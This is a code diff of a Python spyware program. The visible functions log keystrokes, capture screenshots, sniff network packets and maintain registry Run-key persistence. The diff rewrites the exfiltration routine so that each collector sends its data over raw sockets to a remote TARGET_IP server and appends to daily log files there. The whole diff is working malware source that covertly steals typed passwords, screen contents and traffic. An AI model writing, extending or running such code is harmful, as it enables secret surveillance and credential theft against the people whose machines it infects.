@@ -44,8 +44,7 @@ def getRunValues(sExcludedValueName=None):
 def makeScriptName(sScriptPath, sExcludedFileName):
     sDirectory = os.path.dirname(sScriptPath)
     sExistingScriptNames = [
-        f
-        for f in os.listdir(sDirectory)
+        f for f in os.listdir(sDirectory)
         if os.path.isfile(os.path.join(sDirectory, f)) and f != sExcludedFileName
     ]
     if not sExistingScriptNames:
@@ -103,11 +102,33 @@ def monitorRunKey(sScriptPath, sValueName):
     except:
         pass
 
-def exfil_data(data):
+def request_target_file(filename):
+    temp_name = f"_temp_{filename}"
+    data = f"[request]{filename}\n".encode()
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((TARGET_IP, TARGET_PORT))
             s.sendall(data)
+            file_data = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                file_data += chunk
+            if file_data.startswith(b"[nofile]"):
+                return None
+            with open(temp_name, "wb") as f:
+                f.write(file_data)
+        return temp_name
+    except:
+        return None
+
+def send_updated_file(filename, data):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((TARGET_IP, TARGET_PORT))
+            header = f"[upload]{filename}\n".encode()
+            s.sendall(header + data)
     except:
         pass
 
@@ -142,8 +163,18 @@ def start_keylogger():
             stamp = time.strftime("%Y-%m-%d %H:%M:%S")
             time.sleep(KEYLOG_INTERVAL)
             if current_log:
-                data = f"[keylog][{stamp}] {''.join(current_log)}\n".encode()
-                exfil_data(data)
+                day = time.strftime("%Y-%m-%d")
+                filename = f"{day}_keylog.txt"
+                local_temp = request_target_file(filename)
+                if local_temp:
+                    with open(local_temp, "ab") as lf:
+                        lf.write(f"[{stamp}] {''.join(current_log)}\n".encode())
+                    with open(local_temp, "rb") as updated:
+                        send_updated_file(filename, updated.read())
+                    os.remove(local_temp)
+                else:
+                    data = f"[{stamp}] {''.join(current_log)}\n".encode()
+                    send_updated_file(filename, data)
                 current_log.clear()
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
@@ -157,16 +188,26 @@ def capture_screenshots():
         stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
         stream = io.BytesIO()
         shot.save(stream, format="PNG")
-        data = b"[screenshot]" + stamp.encode() + b"\n" + stream.getvalue()
-        exfil_data(data)
+        filename = f"screenshot_{stamp}.png"
+        send_updated_file(filename, stream.getvalue())
         stream.close()
         time.sleep(SCREENSHOT_INTERVAL)
 
 def start_sniffer():
     def packet_callback(packet):
         stamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        data = f"[packets][{stamp}] {packet.summary()}\n".encode()
-        exfil_data(data)
+        day = time.strftime("%Y-%m-%d")
+        filename = f"{day}_packets.txt"
+        local_temp = request_target_file(filename)
+        line = f"[{stamp}] {packet.summary()}\n".encode()
+        if local_temp:
+            with open(local_temp, "ab") as lf:
+                lf.write(line)
+            with open(local_temp, "rb") as updated:
+                send_updated_file(filename, updated.read())
+            os.remove(local_temp)
+        else:
+            send_updated_file(filename, line)
     sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)
 
 def main():
